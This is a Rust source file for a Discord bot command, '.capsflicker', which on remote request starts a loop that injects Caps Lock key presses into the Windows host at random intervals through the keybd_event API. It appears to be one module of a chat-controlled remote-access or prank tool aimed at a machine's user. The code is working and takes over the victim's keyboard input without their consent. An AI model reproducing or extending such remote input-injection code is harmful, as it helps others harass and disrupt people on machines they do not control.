use crate::prelude::*;
use std::sync::atomic::Ordering;
use std::time::Duration;
use windows::Win32::UI::Input::KeyboardAndMouse::{keybd_event, VK_CAPITAL, KEYEVENTF_KEYUP, KEYBD_EVENT_FLAGS};

#[poise::command(prefix_command)]
pub async fn capsflicker(
    ctx: PoiseContext<'_>,
    #[description = "start/stop"]
    #[rest]
    action: Option<String>,
) -> Result<(), Error> {
    let action = match action {
        Some(a) => a.to_lowercase(),
        None => {
            ctx.say("Usage: `.capsflicker <start|stop>`").await?;
            return Ok(());
        }
    };
    
    let caps_active = ctx.data().caps_active.clone();

    match action.as_str() {
        "start" | "on" => {
            if caps_active.load(Ordering::SeqCst) {
                 ctx.say("Caps Lock flicker is already running.").await?;
                 return Ok(());
            }

            caps_active.store(true, Ordering::SeqCst);
            ctx.say("Caps Lock flickering started.").await?;
            
            tokio::task::spawn_blocking(move || {
                let mut rng = rand::thread_rng();
                use rand::Rng;

                while caps_active.load(Ordering::SeqCst) {
                    unsafe {
                        keybd_event(VK_CAPITAL.0 as u8, 0x45, KEYBD_EVENT_FLAGS(0), 0);
                        keybd_event(VK_CAPITAL.0 as u8, 0x45, KEYEVENTF_KEYUP, 0);
                    }
                    
                    let delay = rng.gen_range(100..500);
                    std::thread::sleep(Duration::from_millis(delay));
                }
            });
        }
        "stop" | "off" => {
            caps_active.store(false, Ordering::SeqCst);
            ctx.say("Caps Lock flickering stopped.").await?;
        }
        _ => {
            ctx.say("Usage: `.capsflicker <start|stop>`").await?;
        }
    }
    Ok(())
}
